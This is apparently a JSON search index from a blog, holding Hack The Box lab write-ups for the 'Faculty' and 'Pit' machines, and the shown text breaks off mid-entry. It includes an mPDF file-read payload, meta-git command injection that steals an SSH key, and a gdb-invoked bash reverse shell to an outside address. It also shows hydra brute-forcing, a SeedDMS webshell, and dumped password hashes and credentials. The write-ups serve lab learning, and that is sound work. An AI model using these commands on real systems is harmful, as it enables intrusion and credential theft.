$('table').dataTable();\n$('#new_user').click(function(){\n    uni_modal('New User','manage_user.php')\n})\n$('.edit_user').click(function(){\n    uni_modal('Edit User','manage_user.php?id='+$(this).attr('data-id'))\n})\nChanging tracks - we are able to export “Course List”, “Subject List” and “Faculty List” as PDF. Testing to generate one we find that it’s a simple POST request to /admin/download.php with a huge base64 blob as payload.\nAnalyzing the payload it’s base64 encoded &gt; url encoded &gt; url encoded:\n&lt;h1&gt;&lt;a name=\"top\"&gt;&lt;/a&gt;faculty.htb&lt;/h1&gt;&lt;h2&gt;Subjects&lt;/h2&gt;&lt;table&gt;  &lt;thead&gt;     &lt;tr&gt;            &lt;th class=\"text-center\"&gt;#&lt;/th&gt;          &lt;th class=\"text-left\"&gt;Subject&lt;/th&gt;          &lt;th class=\"text-left\"&gt;Description&lt;/th&gt;          &lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=\"text-center\"&gt;1&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;b&gt;DBMS&lt;/b&gt;&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;small&gt;&lt;b&gt;Database Management System&lt;/b&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=\"text-center\"&gt;2&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;b&gt;Mathematics&lt;/b&gt;&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;small&gt;&lt;b&gt;Mathematics&lt;/b&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=\"text-center\"&gt;3&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;b&gt;English&lt;/b&gt;&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;small&gt;&lt;b&gt;English&lt;/b&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=\"text-center\"&gt;4&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;b&gt;Computer Hardware&lt;/b&gt;&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;small&gt;&lt;b&gt;Computer Hardware&lt;/b&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=\"text-center\"&gt;5&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;b&gt;History&lt;/b&gt;&lt;/td&gt;&lt;td class=\"text-center\"&gt;&lt;small&gt;&lt;b&gt;History&lt;/b&gt;&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tboby&gt;&lt;/table&gt;\nCan we exploit this by editing the content somehow?\n\n\nStep 2\nDownload a PDF and analyze it using exiftool and we find it’s created using mPDF 6.0:\n➜  faculty exiftool OKYKcSDLWNQjVuybnHRm0XG6vr.pdf \nExifTool Version Number         : 12.44\nFile Name                       : OKYKcSDLWNQjVuybnHRm0XG6vr.pdf\nDirectory                       : .\nFile Size                       : 1781 bytes\nFile Modification Date/Time     : 2022:08:26 09:47:42+02:00\nFile Access Date/Time           : 2022:08:26 09:48:08+02:00\nFile Inode Change Date/Time     : 2022:08:26 09:47:57+02:00\nFile Permissions                : -rw-r--r--\nFile Type                       : PDF\nFile Type Extension             : pdf\nMIME Type                       : application/pdf\nPDF Version                     : 1.4\nLinearized                      : No\nPage Count                      : 1\nPage Layout                     : OneColumn\nProducer                        : mPDF 6.0\nCreate Date                     : 2022:08:26 08:46:03+01:00\nModify Date                     : 2022:08:26 08:46:03+01:00\nGoogling for mPDF exploits we find this LFI python script that helps us create a base64 payload to be sent to the victim. As a PoC try to grab /etc/passwd:\n➜  faculty ./mpdf-lfi.py \nFile &gt;&gt; /etc/passwd\n[+] Replace the content with the payload below\nUrl encoded payload:\n%3Cannotation%20file%3D%22/etc/passwd%22%20content%3D%22/etc/passwd%22%20icon%3D%22Graph%22%20title%3D%22Attached%20File%3A%20/etc/passwd%22%20pos-x%3D%22195%22%20/%3E\n\nBase64 encoded payload:\nJTNDYW5ub3RhdGlvbiUyMGZpbGUlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGNvbnRlbnQlM0QlMjIvZXRjL3Bhc3N3ZCUyMiUyMGljb24lM0QlMjJHcmFwaCUyMiUyMHRpdGxlJTNEJTIyQXR0YWNoZWQlMjBGaWxlJTNBJTIwL2V0Yy9wYXNzd2QlMjIlMjBwb3MteCUzRCUyMjE5NSUyMiUyMC8lM0U=\nSend the base64 payload with Burp to create a new pdf. \nAdd the filename to the base URL http://faculty.htb/mpdf/tmp/ do see the PDF. In the left corner you’ll see a green dot indicator on the sidebar, press it got to “Show Attachments” and download the file passwd. \n➜  faculty cat passwd \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false\ngbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash\npostfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin\ndeveloper:x:1001:1002:,,,:/home/developer:/bin/bash\nusbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nWe got LFI!\n\n\nStep 3\nLets see if we can find any sensitive files; id_rsa would be optimal but we aren’t able to access either gbyolo or developer’s. We can start to look for any files containing the database connection and hopefully be able to extract credentials from there. Start by grabbing manage_user.php that we found earlier, and the very top gives us the database connection file; db_connect.php.\n&lt;?php \ninclude('db_connect.php');\nsession_start();\nif(isset($_GET['id'])){\n$user = $conn-&gt;query(\"SELECT * FROM users where id =\".mysql_real_escape_string($_GET['id']));\nforeach($user-&gt;fetch_array() as $k =&gt;$v){\n    $meta[$k] = $v;\n}\n}\n?&gt;\nDownload db_connect.php and bingo, we got a password!\n&lt;?php \n\n$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die(\"Could not connect to mysql\".mysqli_error($con));\nTry to login with found password against user gbyolo and/or developer:\ngbyolo@faculty:~$ id && cat user.txt\nuid=1000(gbyolo) gid=1000(gbyolo) groups=1000(gbyolo)\ncat: user.txt: No such file or directory\nWe don’t have user.txt right yet, but we can confirm that gbyolo:Co.met06aci.dly53ro.per is correct and we have a foothold on the victim.\n\n\nStep 4\nPivot! Start with usual sudo -l\ngbyolo@faculty:~$ sudo -l\n[sudo] password for gbyolo: \nMatching Defaults entries for gbyolo on faculty:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser gbyolo may run the following commands on faculty:\n    (developer) /usr/local/bin/meta-git\nWe’re able to run /usr/local/bin/meta-git as user developer, seems fitting and what we should use to pivot. Reading about meta-git there is a RCE due to lack of input formating.\nLets try a simple PoC and create a file named test:\ngbyolo@faculty:/dev/shm$ ls -al\ntotal 0\ndrwxrwxrwt  3 root root   60 Aug 26 10:41 .\ndrwxr-xr-x 18 root root 3940 Aug 26 08:00 ..\ndrwx------  4 root root   80 Aug 26 08:00 multipath\n\ngbyolo@faculty:/dev/shm$ sudo -u developer /usr/local/bin/meta-git clone 'exploit.se||touch test'\nmeta git cloning into 'exploit.se||touch test' at exploit.se||touch test\n\nexploit.se||touch test:\nfatal: repository 'exploit.se' does not exist\nexploit.se||touch test ✓\n(node:8010) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/exploit.se||touch test'\n    at process.chdir (internal/process/main_thread_only.js:31:12)\n    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)\n    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)\n    at process._tickCallback (internal/process/next_tick.js:68:7)\n    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)\n    at startup (internal/bootstrap/node.js:283:19)\n    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)\n(node:8010) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)\n(node:8010) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.\n\ngbyolo@faculty:/dev/shm$ ls -al\ntotal 0\ndrwxrwxrwt  3 root      root       100 Aug 26 11:00 .\ndrwxr-xr-x 18 root      root      3940 Aug 26 08:00 ..\n-rw-rw-r--  1 developer developer    0 Aug 26 11:00 exploit.se\ndrwx------  4 root      root        80 Aug 26 08:00 multipath\n-rw-rw-r--  1 developer developer    0 Aug 26 11:00 test\nNow weaponize and steal id_rsa:\ngbyolo@faculty:/dev/shm$ sudo -u developer /usr/local/bin/meta-git clone 'exploit.se||cp /home/developer/.ssh/id_rsa . && chmod 777 id_rsa'\nmeta git cloning into 'exploit.se||cp /home/developer/.ssh/id_rsa . && chmod 777 id_rsa' at id_rsa . && chmod 777 id_rsa\n\nid_rsa . && chmod 777 id_rsa:\nfatal: destination path 'exploit.se' already exists and is not an empty directory.\nchmod: changing permissions of '.': Operation not permitted\nid_rsa . && chmod 777 id_rsa: command 'git clone exploit.se||cp /home/developer/.ssh/id_rsa . && chmod 777 id_rsa id_rsa . && chmod 777 id_rsa' exited with error: Error: Command failed: git clone exploit.se||cp /home/developer/.ssh/id_rsa . && chmod 777 id_rsa id_rsa . && chmod 777 id_rsa\n(node:8146) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/id_rsa . && chmod 777 id_rsa'\n    at process.chdir (internal/process/main_thread_only.js:31:12)\n    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)\n    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)\n    at process._tickCallback (internal/process/next_tick.js:68:7)\n    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)\n    at startup (internal/bootstrap/node.js:283:19)\n    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)\n(node:8146) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)\n(node:8146) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.\n\ngbyolo@faculty:/dev/shm$ ls -al\ntotal 4\ndrwxrwxrwt  3 root      root       120 Aug 26 11:03 .\ndrwxr-xr-x 18 root      root      3940 Aug 26 08:00 ..\n-rw-rw-r--  1 developer developer    0 Aug 26 11:00 exploit.se\n-rwxrwxrwx  1 developer developer 2602 Aug 26 11:03 id_rsa\ndrwx------  4 root      root        80 Aug 26 08:00 multipath\n-rw-rw-r--  1 developer developer    0 Aug 26 11:00 test\nLogin and grab user.txt:\n➜  faculty vim developer-id_rsa          \n➜  faculty chmod 400 developer-id_rsa \n➜  faculty ssh developer@faculty.htb -i developer-id_rsa\ndeveloper@faculty:~$ id && cat user.txt\nuid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)\n904b8c9a6982c444e519674b88a31b25\n\n\n\nROOT\n\nStep 1\nAs seen from id user developer is part of group debug, this is interesting. See if there are any files owned by group debug:\ndeveloper@faculty:/$ find / -group debug 2&gt; /dev/null\n/usr/bin/gdb\nWith GDB we can attach different processes and dump their memory, in hope of finding credentials.\ngdb -p &lt;FTP_PROCESS_PID&gt;\n(gdb) info proc mappings\n(gdb) q\n(gdb) dump memory /tmp/&lt;name&gt;.mem &lt;START_HEAD&gt; &lt;END_HEAD&gt;\n(gdb) q\nstrings /tmp/&lt;name&gt;.mem\nTrying to dump a lot of processes I find nothing and decide to continue looking for other ways to use gdb.\nAfter a while I come across this information from HackTricks:\n\n“If GDB is installed (or you can install it with apk add gdb or apt install gdb for example) you can debug a process from the host and make it call the system function. (This technique also requires the capability SYS_ADMIN).”\n\nWith this example attached to it:\ngdb -p 1234\n(gdb) call (void)system(\"ls\")\n(gdb) call (void)system(\"sleep 5\")\n(gdb) call (void)system(\"bash -c 'bash -i &gt;& /dev/tcp/192.168.115.135/5656 0&gt;&1'\")\n\n“Linux Capabilities are used to allow binaries (executed by non-root users) to perform privileged operations without providing them all root permissions. This model allows the binary or program to grant specific permissions to perform privileged operations rather than giving them root privileges by granting setuid, setguid or sudo without a password.”\n\ndeveloper@faculty:~$ getcap $(which gdb)\n/usr/bin/gdb = cap_sys_ptrace+ep\nWith found cabability, ptrace, the current user can attach to other processes and trace their system calls. Testing to attach to a bunch of different services I get this error when trying to call system function:\n(gdb) call (void)system(\"id\")\nNo symbol \"system\" in current context.\nHowever, I find one process that do work and we’re able to get a reverse shell as root!\ndeveloper@faculty:/dev/shm$ ps aux | grep root\n[... snip ...]\nroot         733  0.0  0.9  26896 18172 ?        Ss   08:00   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers\n\ndeveloper@faculty:/dev/shm$ gdb -p 733\n[... snip ...]\n(gdb) call (void)system(\"bash -c 'bash -i &gt;& /dev/tcp/10.10.14.4/4488 0&gt;&1'\")\n[Detaching after vfork from child process 49752]\n\n➜  faculty nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.11.169] 57988\nbash: cannot set terminal process group (733): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@faculty:/# id && cat /root/root.txt\nuid=0(root) gid=0(root) groups=0(root)\nb8a6c75d466c5979b9886556151f2866\n\ncat /etc/shadow\nroot:$6$CiEa.wxtUKxG5q21$ED3MTE6ehz0j0q4kRQfK4bnLQFLZDrG9skIPsc0p2/X3JSBHFWjRWAZwEdUpqON6UqZOXvme7.1wHzNCVHqk9/:18559:0:99999:7:::\ngbyolo:$6$ccGHy1FmLiRRtdRO$8YUhXxCWlUNP7/VSch6vqb3aEMs4j/ncGyPCObyl9rS8C/ZDiC4.NOXAb0B1cuMir0ilQK.IDWFjDEryXV5fx1:19165:0:99999:7:::\ndeveloper:$6$oY/UDfRNf0UfWpGG$PUFSZoqX4AM1igh7RFTCLRnbs4Qi19jdqOMeZWBIwnkVS//6iyRbNaY/ZFcNoCFDMfdgAlnA4C7EiPRV9Ayvc.:18559:0:99999:7:::"
  },
  {
    "objectID": "posts/2021-05-18-htb-writeup-pit/2021-05-18-htb-writeup-pit.html",
    "href": "posts/2021-05-18-htb-writeup-pit/2021-05-18-htb-writeup-pit.html",
    "title": "Pit - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/pit]# nmap -Pn -n -sCV –open 10.10.10.241 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA) | 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA) |_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519) 80/tcp open http nginx 1.14.1 |_http-server-header: nginx/1.14.1 |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux 9090/tcp open ssl/zeus-admin? | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 400 Bad request | Content-Type: text/html; charset=utf8 | Transfer-Encoding: chunked | X-DNS-Prefetch-Control: off | Referrer-Policy: no-referrer | X-Content-Type-Options: nosniff | Cross-Origin-Resource-Policy: same-origin | &lt;!DOCTYPE html&gt; |\n\n    \n\nPORT STATE SERVICE 161/udp open|filtered snmp\nHostname: dms-pit.htb\nDIRB: + http://10.10.10.241/index.html (CODE:200|SIZE:4057) + https://10.10.10.241:9090/favicon.ico (CODE:200|SIZE:819) + https://10.10.10.241:9090/ping (CODE:200|SIZE:24)\nNIKTO: -\n\nhttp://10.10.10.241 shows the default index.html for nginx. https://10.10.10.241:9090 is a CentOS login page, we find the hostname ‘pit.htb’, and in the certificate ‘dms-pit.htb’. Capturing the login we see a GET request, where the credentials are base64 encoded.\n\nBURP REQUEST: GET /cockpit/login HTTP/1.1 Host: 10.10.10.241:9090 Cookie: cockpit=deleted User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: Basic YWRtaW46YWRtaW4= X-Authorize: password X-Superuser: any Te: trailers Connection: close\nIn the request we see ‘/cockpit’ - what is that? &gt; Cockpit is a web-based administration tool for your linux servers. &gt; With it you can manage and update your system, view logs, add users and ever run a terminal. &gt; All within a browser!\nDigging deeper into ‘Cockpit’ and we find that there are a unauth SSRF and RCE exploits. Trying out the exploits give nothing, maybe I’m missing something here.\nInstead I went back to enumerating and found that SNMP is open. Running ‘snmp-check’ gave some information, but nothing really useful. Turning to ‘snmpwalk.py’ and playing around with the OID’s gave us user michelle, and an absolute path to a web service.\n[root:/git/htb/pit]# ./snmpwalk.py -v 1 -c public 10.10.10.241 1.3.6.1.4.1 .. SNMPv2-SMI::enterprises.2021.9.1.2.2 = OctetString: /var/www/html/seeddms51x/seeddms SNMPv2-SMI::enterprises.2021.9.1.3.1 = OctetString: /dev/mapper/cl-root SNMPv2-SMI::enterprises.2021.9.1.3.2 = OctetString: /dev/mapper/cl-seeddms .. SNMPv2-SMI::enterprises.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = OctetString: /usr/bin/monitor .. SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.13 = OctetString: SELinux User Prefix MCS Level MCS Range SELinux Roles SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.14 = OctetString: SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.15 = OctetString: guest_u user s0 s0 guest_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.16 = OctetString: root user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.17 = OctetString: staff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.18 = OctetString: sysadm_u user s0 s0-s0:c0.c1023 sysadm_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.19 = OctetString: system_u user s0 s0-s0:c0.c1023 system_r unconfined_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.20 = OctetString: unconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.21 = OctetString: user_u user s0 s0 user_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.22 = OctetString: xguest_u user s0 s0 xguest_r SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.23 = OctetString: login SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.24 = OctetString: SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.25 = OctetString: Login Name SELinux User MLS/MCS Range Service SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.26 = OctetString: SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = OctetString: default unconfined_u s0-s0:c0.c1023  SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.28 = OctetString: michelle user_u s0  SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.29 = OctetString: root unconfined_u s0-s0:c0.c1023 *\nOID’s explained; 1: iso 3: identified-organization 6: dod 1: internet 4: private 1: enterprise\n\nAccess the webservice - ‘http://dms-pit.htb/seeddms51x/seeddms’. We are prompted with a login, try to login with michelle and capture the request to see what’s going on.\n\nIt’s a simple http post form where the auth data is sent in clear text. Reading about SeedDMS the standard default user is ‘admin’. To speed things up we use hydra to brute force the password of our two potential users - michelle and admin, starting with michelle.\nORIGINAL REQUEST: POST /seeddms51x/seeddms/op/op.Login.php HTTP/1.1 Host: dms-pit.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 74 Origin: http://dms-pit.htb Connection: close Referer: http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F Upgrade-Insecure-Requests: 1\nreferuri=/seeddms51x/seeddms/&login=michelle&pwd=password&lang=en_GB\n[root:/git/htb/pit]# hydra -l michelle -P /usr/share/wordlists/rockyou.txt -vV -f dms-pit.htb http-post-form “/seeddms51x/seeddms/op/op.Login.php:login=USER&pwd=PASS:Error signing in” .. [80][http-post-form] host: dms-pit.htb login: michelle password: michelle\nA working set of credentials! Login as michelle:michelle and enumerate the site. Going to ‘My Account’ &gt; Users we find all available users; Administrator (admin@pit.htb) Jack (jack@dms-pit.htb) Michelle (michelle@pit.htb)\nWe find another note from the Administrator: &gt; “Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15.” &gt; “See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb.”\nLooking for vulnerabilities in SeedDMS we find a RCE vuln via the upload function. a) Upload a webshell and take note of it’s document ID b) Exploit using curl/browser, where 1048576 is constant directory, 46 is document id, and 1.php is the renamed file.\n[root:/git/htb/pit]# curl http://dms-pit.htb/seeddms51x/data/1048576/46/1.php?cmd=id (master✱) \nuid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0\n    \n\n\nEnumerate the service and while looking in SeedDMS settings-file we finda database user + password. [root:/git/htb/pit]# curl http://dms-pit.htb/seeddms51x/data/1048576/46/1.php?cmd=‘cat /var/www/html/seeddms51x/conf/settings.xml’ .. \n\nTry the password against services we know - SeedDMS jack:ied^ieY6xoquu, admin:ied^ieY6xoquu - no match. Try on the pit.htb:9090, admin:ied^ieY6xoquu, root:ied^ieY6xoquu, michelle:ied^ieY6xoquu - MATCH!\n\npit.htb:9090, michelle:ied^ieY6xoquu works!\nIn the bottom left of the navbar we find “Terminal”, press it and grab user.txt.\n[michelle@pit ~]$ cat user.txt 6ccbdd3941e1d701503b52b4cd30073f\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nFor persistence and ease of use create a SSH-key and add it to /home/michelle/.ssh/authorized_keys\n\n[root:/git/htb/pit]# ssh-keygen -t rsa -b 4096 -f michelle-id_rsa (master✱) Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in michelle-id_rsa Your public key has been saved in michelle-id_rsa.pub The key fingerprint is: SHA256:LY62mMgVYacdhVKZ9Y09zenY7ptew7WYu70viJ8tXcI root@nidus The key’s randomart image is: +—[RSA 4096]—-+ | ..=o | | . +. . + o . | | o.o o + + | | . = . . = | | o . S . ..o .| | . o . .E +| | . o . . =.*.| | . o + . . o+=o.| | o o . .o=B=+| +—-[SHA256]—–+\n[michelle@pit ~]$ mkdir .ssh [michelle@pit ~]$ cd .ssh/ [michelle@pit .ssh]$ echo “ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCbGm8z5rFxUftH1sJkVxfAmFd+vPq8p7FsfQjOuBhtOtGsLvxIiJ3seKPUDQ/uS1oc4PCFuGpjhix9HxN55JRWohmn+JblAlDU7zC6MFh1TG14YlM1joJhgp+CNGq00wEcAaOoMHEjIA0u04fzQikPHxdZSYsT9Al01LvSXVW5IutZlJ0OovFWH2GsjzyM/6BGFat1loApTTYH7VbNIEmHEKh14a8gpmS9Izkd8cCkqUu5l6UA3AG1Sh4VGgAuwgAP1MUcMKIK0HWf1qWcrP0ZE1y6I9/gDGCHi0mmyrnVSCPdPm2oIchmV/WCkVP2PYrk+U9wrWtWN02RgSBntAQQAIW8pdekad3TldoHJtUcbW7EZ4QUyJHtDXWTw9drmVU43j4zlQeNbzKVlExl+XBneEHptntT7nScvD9ED33ONC2Y4lIoSmUnlkqPWCv/euvuvv0YrhDTGmg8G95dp89DX59mszrJy5XLWjFJ6lCgxUAAlNC5c7mhBORWkryib30Bi117BSBazhPa8zzeKhYQwqeJ3nwfM1D3pL+5pOLa7b++IwzriaTWDV2Yq+QdOd9vSNGZuXOX/gZ7pW9TrUYKJb68xDIXl1GfLRt4k5XLoNHW7h3PFCi5xr49Avcnje38wDpWE0l4uN35QsZhigVUOuxCPrhylSBD+5J/8MwJ9Q==” &gt; authorized_keys [michelle@pit .ssh]$ chmod 700 ~/.ssh [michelle@pit .ssh]$ chmod 600 ~/.ssh/authorized_keys\n[root:/git/htb/pit]# chmod 400 michelle-id_rsa [root:/git/htb/pit]# ssh michelle@pit.htb -i michelle-id_rsa (master✱) Web console: https://pit.htb:9090/\nLast login: Tue May 18 06:58:20 2021\n[michelle@pit ~]$\n\nExecute standard manual enum - ‘sudo -l’, ‘ss -tulwn’, ‘ps -aux’, sql database etc.\n\n[michelle@pit /]$ ss -tulwn Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port icmp6 UNCONN 0 0 :58 : udp UNCONN 0 0 0.0.0.0:161 0.0.0.0: udp UNCONN 0 0 127.0.0.1:323 0.0.0.0: udp UNCONN 0 0 [::1]:323 [::]: tcp LISTEN 0 64 127.0.0.1:33767 0.0.0.0: tcp LISTEN 0 128 127.0.0.1:199 0.0.0.0: tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0: tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0: tcp LISTEN 0 128 :9090 : tcp LISTEN 0 80 :3306 : tcp LISTEN 0 128 [::]:80 [::]: tcp LISTEN 0 128 [::]:22 [::]:\nWith ‘ps -aux’ we are not able to see all services, we could see a lot more from snmp-check or snmpwalk.\n[michelle@pit shm]$ ./linpeas.sh .. [+] PATH [i] 